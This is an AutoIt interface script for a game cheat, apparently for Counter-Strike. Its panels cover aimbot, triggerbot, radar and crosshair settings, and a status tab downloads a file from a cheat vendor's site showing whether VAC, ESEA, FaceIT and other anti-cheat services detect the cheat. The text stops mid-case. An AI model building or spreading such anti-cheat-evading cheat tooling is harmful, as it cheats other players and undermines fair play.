Global Const $tab = GUICtrlCreateTab(10,40, 200, 200) ; can be placed anywhere, doesnt matter, not visible
GUICtrlSetState($tab, $GUI_HIDE)


;##################################
;           Graphics
;#################################

GUICtrlCreateGraphic(10, 30, 101, 359)
GUICtrlSetColor(-1, 0x141414)
GUICtrlSetBkColor(-1, 0x141414)

GUICtrlCreateGraphic(10, 30, 1, 359)
GUICtrlSetColor(-1, 0x5F5E5E)

GUICtrlCreateGraphic(10, 30, 529, 1)
GUICtrlSetColor(-1, 0x45F5E5E)

GUICtrlCreateGraphic(10, 389, 529, 1)
GUICtrlSetColor(-1, 0x5F5E5E)

GUICtrlCreateGraphic(539, 30, 1, 360)
GUICtrlSetColor(-1, 0x5F5E5E)

GUICtrlCreateGraphic(111, 31, 5, 358)
GUICtrlSetColor(-1, 0x750606)
GUICtrlSetBkColor(-1, 0x750606)

;##################################
;           Aimbot Content
;#################################
Global Const $tab1 = GUICtrlCreateTabItem("tab1")

GUICtrlCreateLabel("AimKey", 445, 39)
GUICtrlSetColor(-1, 0xFFFFFF)
$keydis = GUICtrlCreateLabel($key, 426, 53, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor($keydis, 0xFFFFFF)
GUICtrlSetBkColor($keydis, 0x767575)
$keymin = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 401, 52, 20, 20)
$keyplus = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 506, 52, 20, 20)



GUICtrlCreateLabel("Smooth", 445, 80)
GUICtrlSetColor(-1, 0xFFFFFF)
$smoothdis = GUICtrlCreateLabel($smooth, 426, 94, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor($smoothdis, 0xFFFFFF)
GUICtrlSetBkColor($smoothdis, 0x767575)
$smoothmin = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 401, 93, 20, 20)
$smoothplus = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 506, 93, 20, 20)



If $viasghfaf = 1 Then
$VISon = GUICtrlCreatePic(@TempDir & "\Active.bmp", 122, 42, 50, 30)
Else
$VISon = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 122, 42, 50, 30)
EndIf
GUICtrlCreateLabel("Visibility Check", 178, 52)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)



GUICtrlCreateGraphic(128, 131, 399, 245)
GUICtrlSetColor(-1, 0x750606)
GUICtrlSetState(-1, $GUI_DISABLE)


$hCombo = GUICtrlCreateCombo("", 200, 335, 250, 20)

GUICtrlSetData($hCombo, $sList)


GUICtrlCreateLabel("FoV", 188, 138)
GUICtrlSetColor(-1, 0xFFFFFF)
$menufov = GUICtrlCreateLabel("??", 160, 156, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetBkColor(-1, 0x767575)


$fovright = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 240, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)
$fovleft = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 135, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)


GUICtrlCreateLabel("Height", 310, 138)
GUICtrlSetColor(-1, 0xFFFFFF)
$menuheight = GUICtrlCreateLabel("??", 290, 156, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetBkColor(-1, 0x767575)


$heightright = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 370, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)
$heightleft = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 265, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)

GUICtrlCreateLabel("Delay", 440, 138)
GUICtrlSetColor(-1, 0xFFFFFF)
$menudelay = GUICtrlCreateLabel("??", 420, 156, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetBkColor(-1, 0x767575)


$Aimon = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 132, 200, 50, 30)
GUICtrlCreateLabel("Enable", 138, 188)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)

$RCSon = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 188, 200, 50, 30)
GUICtrlCreateLabel("RCS", 194, 188)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)


$delayright = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 500, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)
$delayleft = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 395, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)

$save = GUICtrlCreateButton("Save Current Settings", 242, 310, 150, 16)
;##################################
;           Triggerbot Content
;#################################
Global Const $tab2 = GUICtrlCreateTabItem("tab2")



GUICtrlCreateLabel("TriggerKey", 445, 39)
GUICtrlSetColor(-1, 0xFFFFFF)
$tkeydis = GUICtrlCreateLabel($ptkey, 426, 53, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor($tkeydis, 0xFFFFFF)
GUICtrlSetBkColor($tkeydis, 0x767575)
$tkeymin = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 401, 52, 20, 20)
$tkeyplus = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 506, 52, 20, 20)




GUICtrlCreateGraphic(128, 131, 399, 245)
GUICtrlSetColor(-1, 0x750606)
GUICtrlSetState(-1, $GUI_DISABLE)


$thCombo = GUICtrlCreateCombo("", 200, 335, 250, 20)

GUICtrlSetData($thCombo, $sList)


GUICtrlCreateLabel("Hitbox", 188, 138)
GUICtrlSetColor(-1, 0xFFFFFF)
$menuhitbox = GUICtrlCreateLabel("??", 160, 156, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetBkColor(-1, 0x767575)


$thitright = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 240, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)
$thitleft = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 135, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)


GUICtrlCreateLabel("Before Delay", 310, 138)
GUICtrlSetColor(-1, 0xFFFFFF)
$menubefore = GUICtrlCreateLabel("??", 290, 156, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetBkColor(-1, 0x767575)


$beforetright = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 370, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)
$beforeleft = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 265, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)

GUICtrlCreateLabel("After Delay", 440, 138)
GUICtrlSetColor(-1, 0xFFFFFF)
$menuafter = GUICtrlCreateLabel("??", 420, 156, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetBkColor(-1, 0x767575)

$afterright = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 500, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)
$afterleft = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 395, 155, 20, 20)
GUICtrlSetColor(-1, 0xFFFFFF)


$trigon = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 132, 200, 50, 30)
GUICtrlCreateLabel("Enable", 138, 188)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)

$Allbon = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 188, 200, 50, 30)
GUICtrlCreateLabel("FullBody", 194, 188)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)


$tsave = GUICtrlCreateButton("Save Current Settings", 242, 310, 150, 16)


;##################################
;           Radar Content
;#################################
Global Const $tab3 = GUICtrlCreateTabItem("tab3")
$radarenable = IniRead($FileSet, "Settings", "Radar_Enabled", 0)
$radardisread = IniRead ($FileSet, "Settings", "Radar_Distance", 0)

If $radarenable = 1 Then
$Radaron = GUICtrlCreatePic(@TempDir & "\Active.bmp", 125, 38, 50, 30)
Else
$Radaron = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 125, 38, 50, 30)
EndIf
GUICtrlCreateLabel("Enabled", 180, 48)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)

GUICtrlCreateLabel("Distance", 445, 39)
GUICtrlSetColor(-1, 0xFFFFFF)
$radardistance = GUICtrlCreateLabel($radardisread, 426, 53, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor($radardistance, 0xFFFFFF)
GUICtrlSetBkColor($radardistance, 0x767575)
$radarmin = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 401, 52, 20, 20)
$radarplus = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 506, 52, 20, 20)


$rsave = GUICtrlCreateButton("Save Current Settings", 242, 310, 150, 16)



;##################################
;           MISC Content
;#################################
Global Const $tab4 = GUICtrlCreateTabItem("tab4")

GUICtrlCreateLabel("Crosshair", 130, 95)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)

GUICtrlCreateGraphic(128, 110, 400, 100)
GUICtrlSetColor(-1, 0xFF0000)
GUICtrlSetState(-1, $GUI_DISABLE)


If $Croshair = 1 Then
$crosshairon = GUICtrlCreatePic(@TempDir & "\Active.bmp", 130, 113, 50, 30)
Else
$crosshairon = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 130, 113, 50, 30)
EndIf
GUICtrlCreateLabel("Enable", 185, 123)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)

GUICtrlCreateLabel("Up/Down", 172, 168)
GUICtrlSetColor(-1, 0xFFFFFF)
$drawcrossdis = GUICtrlCreateLabel($adup, 157, 183, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor($drawcrossdis, 0xFFFFFF)
GUICtrlSetBkColor($drawcrossdis, 0x767575)
$drawcrossmin = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 134, 182, 20, 20)
$drawcrossplus = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 237, 182, 20, 20)

GUICtrlCreateLabel("Left/Right", 302, 168)
GUICtrlSetColor(-1, 0xFFFFFF)
$drawcrossdis2 = GUICtrlCreateLabel($adside, 286, 183, 75, 18, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetColor($drawcrossdis2, 0xFFFFFF)
GUICtrlSetBkColor($drawcrossdis2, 0x767575)
$drawcrossmin2 = GUICtrlCreatePic(@TempDir & "\Decrease.bmp", 263, 182, 20, 20)
$drawcrossplus2 = GUICtrlCreatePic(@TempDir & "\Increase.bmp", 366, 182, 20, 20)


If $watermarkactive = 1 Then
$wateron = GUICtrlCreatePic(@TempDir & "\Active.bmp", 125, 38, 50, 30)
Else
$wateron = GUICtrlCreatePic(@TempDir & "\Disable.bmp", 125, 38, 50, 30)
EndIf
GUICtrlCreateLabel("WaterMark", 180, 48)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)





;##################################
;          Live-Status Content
;#################################
Global Const $tab5 = GUICtrlCreateTabItem("tab5")

$refresh = GUICtrlCreateButton("Refresh Status", 440, 45, 85, 15)

GUICtrlCreateLabel("Information", 130, 315)
GUICtrlSetColor(-1, 0xFFFFFF)
GUICtrlSetFont(-1, 8.5, 400)

GUICtrlCreateGraphic(128, 330, 400, 50)
GUICtrlSetColor(-1, 0xFF0000)
GUICtrlSetState(-1, $GUI_DISABLE)


GUICtrlCreateLabel("Undetected", 145, 335)
GUICtrlSetColor(-1, 0xFFFFFF)

GUICtrlCreatePic(@TempDir & "\Status.bmp", 155, 350, 30, 8)
GUICtrlSetState(-1, $GUI_DISABLE)

GUICtrlCreateLabel("Use at own risk", 285, 335)
GUICtrlSetColor(-1, 0xFFFFFF)

GUICtrlCreatePic(@TempDir & "\Chance.bmp", 305, 350, 30, 8)
GUICtrlSetState(-1, $GUI_DISABLE)

GUICtrlCreateLabel("Detected", 455, 335)
GUICtrlSetColor(-1, 0xFFFFFF)

GUICtrlCreatePic(@TempDir & "\Security.bmp", 465, 350, 30, 8)
GUICtrlSetState(-1, $GUI_DISABLE)


GUICtrlCreateLabel("VAC3", 155, 55)
GUICtrlSetColor(-1, 0xFFFFFF)
$vacstatus = IniRead(@TempDir & "\Status.txt", "Status", "VAC", 4)
If $vacstatus = 1 Then
	$vac = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 58, 30, 8)
EndIf
If $vacstatus = 2 Then
	$vac = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 58, 30, 8)
EndIf
If $vacstatus = 3 Then
	$vac = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 58, 30, 8)
EndIf

GUICtrlCreateLabel("CEVO", 155, 90)
GUICtrlSetColor(-1, 0xFFFFFF)
$CEVOstatus = IniRead(@TempDir & "\Status.txt", "Status", "CEVO", 4)
If $CEVOstatus = 1 Then
	$CEVO = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 93, 30, 8)
EndIf
If $CEVOstatus = 2 Then
	$CEVO = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 93, 30, 8)
EndIf
If $CEVOstatus = 3 Then
	$CEVO = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 93, 30, 8)
EndIf

GUICtrlCreateLabel("ESL", 155, 125)
GUICtrlSetColor(-1, 0xFFFFFF)
$ESLstatus = IniRead(@TempDir & "\Status.txt", "Status", "ESL", 4)
If $ESLstatus = 1 Then
	$ESL = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 128, 30, 8)
EndIf
If $ESLstatus = 2 Then
	$ESL = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 128, 30, 8)
EndIf
If $ESLstatus = 3 Then
	$ESL = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 128, 30, 8)
EndIf

GUICtrlCreateLabel("ESEA", 155, 160)
GUICtrlSetColor(-1, 0xFFFFFF)
$ESEAstatus = IniRead(@TempDir & "\Status.txt", "Status", "ESEA", 4)
If $ESEAstatus = 1 Then
	$ESEA = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 163, 30, 8)
EndIf
If $ESEAstatus = 2 Then
	$ESEA = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 163, 30, 8)
EndIf
If $ESEAstatus = 3 Then
	$ESEA = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 163, 30, 8)
EndIf

GUICtrlCreateLabel("FaceIT", 155, 195)
GUICtrlSetColor(-1, 0xFFFFFF)
$FaceITstatus = IniRead(@TempDir & "\Status.txt", "Status", "FaceIT", 4)
If $FaceITstatus = 1 Then
	$FACEIT = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 198, 30, 8)
EndIf
If $FaceITstatus = 2 Then
	$FACEIT = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 198, 30, 8)
EndIf
If $FaceITstatus = 3 Then
	$FACEIT = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 198, 30, 8)
EndIf

GUICtrlCreateLabel("Azereus", 155, 230)
GUICtrlSetColor(-1, 0xFFFFFF)
$Azereusstatus = IniRead(@TempDir & "\Status.txt", "Status", "Azereus", 4)
If $Azereusstatus = 1 Then
	$Azer = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 233, 30, 8)
EndIf
If $Azereusstatus = 2 Then
	$Azer = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 233, 30, 8)
EndIf
If $Azereusstatus = 3 Then
	$Azer = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 233, 30, 8)
EndIf

GUICtrlCreateLabel("Custodia", 155, 265)
GUICtrlSetColor(-1, 0xFFFFFF)
$Custodiastatus = IniRead(@TempDir & "\Status.txt", "Status", "Custodia", 4)
If $Custodiastatus = 1 Then
	$Custo = GUICtrlCreatePic(@TempDir & "\Status.bmp", 250, 268, 30, 8)
EndIf
If $Custodiastatus = 2 Then
	$Custo = GUICtrlCreatePic(@TempDir & "\Chance.bmp", 250, 268, 30, 8)
EndIf
If $Custodiastatus = 3 Then
	$Custo = GUICtrlCreatePic(@TempDir & "\Security.bmp", 250, 268, 30, 8)
EndIf

While 1
	AdlibRegister("Info", 10)
	sleep(5)
	AdlibRegister("Aimbot", 1)
	Sleep(1)
	AdlibRegister("VisAimbot", 1)
	Sleep(1)
	AdlibRegister("pTriggerbot", 1)
	Sleep(1)

Switch GUIGetMsg()
		Case $GUI_EVENT_CLOSE
			Exit

		 Case $TabSwitcher1
            If GUICtrlRead($tab, 1) = $tab1 Then ContinueLoop ; To prevent the flickering and second state set.
            GUICtrlSetState($tab1, $GUI_SHOW)
            GUICtrlSetBkColor($TabSwitcher1, 0x750606)
            GUICtrlSetColor($TabSwitcher1, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher2, 0x292929)
            GUICtrlSetColor($TabSwitcher2, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher3, 0x292929)
            GUICtrlSetColor($TabSwitcher3, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher4, 0x292929)
            GUICtrlSetColor($TabSwitcher4, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher5, 0x292929)
            GUICtrlSetColor($TabSwitcher5, 0xFFFFFF)

        Case $TabSwitcher2
            If GUICtrlRead($tab, 1) = $tab2 Then ContinueLoop ; To prevent the flickering and second state set.
            GUICtrlSetState($tab2, $GUI_SHOW)
            GUICtrlSetBkColor($TabSwitcher1, 0x292929)
            GUICtrlSetColor($TabSwitcher1, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher2, 0x750606)
            GUICtrlSetColor($TabSwitcher2, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher3, 0x292929)
            GUICtrlSetColor($TabSwitcher3, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher4, 0x292929)
            GUICtrlSetColor($TabSwitcher4, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher5, 0x292929)
            GUICtrlSetColor($TabSwitcher5, 0xFFFFFF)

        Case $TabSwitcher3
            If GUICtrlRead($tab, 1) = $tab3 Then ContinueLoop ; To prevent the flickering and second state set.
            GUICtrlSetState($tab3, $GUI_SHOW)
            GUICtrlSetBkColor($TabSwitcher1, 0x292929)
            GUICtrlSetColor($TabSwitcher1, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher2, 0x292929)
            GUICtrlSetColor($TabSwitcher2, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher3, 0x750606)
            GUICtrlSetColor($TabSwitcher3, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher4, 0x292929)
            GUICtrlSetColor($TabSwitcher4, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher5, 0x292929)
            GUICtrlSetColor($TabSwitcher5, 0xFFFFFF)

        Case $TabSwitcher4
            If GUICtrlRead($tab, 1) = $tab4 Then ContinueLoop ; To prevent the flickering and second state set.
            GUICtrlSetState($tab4, $GUI_SHOW)
            GUICtrlSetBkColor($TabSwitcher1, 0x292929)
            GUICtrlSetColor($TabSwitcher1, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher2, 0x292929)
            GUICtrlSetColor($TabSwitcher2, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher3, 0x292929)
            GUICtrlSetColor($TabSwitcher3, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher4, 0x750606)
            GUICtrlSetColor($TabSwitcher4, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher5, 0x292929)
            GUICtrlSetColor($TabSwitcher5, 0xFFFFFF)

        Case $TabSwitcher5
            If GUICtrlRead($tab, 1) = $tab5 Then ContinueLoop ; To prevent the flickering and second state set.
            GUICtrlSetState($tab5, $GUI_SHOW)
            GUICtrlSetBkColor($TabSwitcher1, 0x292929)
            GUICtrlSetColor($TabSwitcher1, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher2, 0x292929)
            GUICtrlSetColor($TabSwitcher2, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher3, 0x292929)
            GUICtrlSetColor($TabSwitcher3, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher4, 0x292929)
            GUICtrlSetColor($TabSwitcher4, 0xFFFFFF)
            GUICtrlSetBkColor($TabSwitcher5, 0x750606)
            GUICtrlSetColor($TabSwitcher5, 0xFFFFFF)




func StatusUpdate()

     Local $dlstatus = InetGet("http://plexy-software.com/forum/panel/Status.txt", @TempDir & "\Status.txt", 1, 1)

     $dl_taillestatus = InetGetSize("http://plexy-software.com/forum/panel/Status.txt")
      Sleep(500)
      $runningstatus = InetGetInfo($dlstatus, 0)
EndFunc



		Case $refresh
StatusUpdate()

$vacstatus = IniRead(@TempDir & "\Status.txt", "Status", "VAC", 4)
If $vacstatus = 1 Then
	GUICtrlSetImage($vac, @TempDir & "\Status.bmp")
EndIf
If $vacstatus = 2 Then
	GUICtrlSetImage($vac, @TempDir & "\Chance.bmp")
EndIf
If $vacstatus = 3 Then
	GUICtrlSetImage($vac, @TempDir & "\Security.bmp")
EndIf


$CEVOstatus = IniRead(@TempDir & "\Status.txt", "Status", "CEVO", 4)
If $CEVOstatus = 1 Then
	GUICtrlSetImage($CEVO, @TempDir & "\Status.bmp")
EndIf
If $CEVOstatus = 2 Then
	GUICtrlSetImage($CEVO, @TempDir & "\Chance.bmp")
EndIf
If $CEVOstatus = 3 Then
	GUICtrlSetImage($CEVO, @TempDir & "\Security.bmp")
EndIf


$ESLstatus = IniRead(@TempDir & "\Status.txt", "Status", "ESL", 4)
If $ESLstatus = 1 Then
	GUICtrlSetImage($ESL, @TempDir & "\Status.bmp")
EndIf
If $ESLstatus = 2 Then
	GUICtrlSetImage($ESL, @TempDir & "\Chance.bmp")
EndIf
If $ESLstatus = 3 Then
	GUICtrlSetImage($ESL, @TempDir & "\Security.bmp")
EndIf


$ESEAstatus = IniRead(@TempDir & "\Status.txt", "Status", "ESEA", 4)
If $ESEAstatus = 1 Then
	GUICtrlSetImage($ESEA, @TempDir & "\Status.bmp")
EndIf
If $ESEAstatus = 2 Then
	GUICtrlSetImage($ESEA, @TempDir & "\Chance.bmp")
EndIf
If $ESEAstatus = 3 Then
	GUICtrlSetImage($ESEA, @TempDir & "\Security.bmp")
EndIf


$FaceITstatus = IniRead(@TempDir & "\Status.txt", "Status", "FaceIT", 4)
If $FaceITstatus = 1 Then
	GUICtrlSetImage($FaceIT, @TempDir & "\Status.bmp")
EndIf
If $FaceITstatus = 2 Then
	GUICtrlSetImage($FaceIT, @TempDir & "\Chance.bmp")
EndIf
If $FaceITstatus = 3 Then
	GUICtrlSetImage($FaceIT, @TempDir & "\Security.bmp")
EndIf


$Azereusstatus = IniRead(@TempDir & "\Status.txt", "Status", "Azereus", 4)
If $Azereusstatus = 1 Then
	GUICtrlSetImage($Azer, @TempDir & "\Status.bmp")
EndIf
If $Azereusstatus = 2 Then
	GUICtrlSetImage($Azer, @TempDir & "\Chance.bmp")
EndIf
If $Azereusstatus = 3 Then
	GUICtrlSetImage($Azer, @TempDir & "\Security.bmp")
EndIf


$Custodiastatus = IniRead(@TempDir & "\Status.txt", "Status", "Custodia", 4)
If $Custodiastatus = 1 Then
	GUICtrlSetImage($Custo, @TempDir & "\Status.bmp")
EndIf
If $Custodiastatus = 2 Then
	GUICtrlSetImage($Custo, @TempDir & "\Chance.bmp")
EndIf
If $Custodiastatus = 3 Then
	GUICtrlSetImage($Custo, @TempDir & "\Security.bmp")
EndIf

        Case $hCombo
            Switch GUICtrlRead($hCombo)





                Case "Deagle"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_deagle.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_deagle.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_deagle.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_deagle.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_deagle.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

                Case "P2000"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p2000.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p2000.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p2000.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_p2000.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p2000.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

                Case "elite"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_elite.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_elite.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_elite.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_elite.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_elite.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "p90"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p90.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p90.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p90.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_p90.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p90.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mac10"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mac10.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mac10.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mac10.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_mac10.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mac10.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "bizon"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_bizon.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_bizon.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_bizon.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_bizon.enabled", 0)
					If $readenablevalue = 1 Then
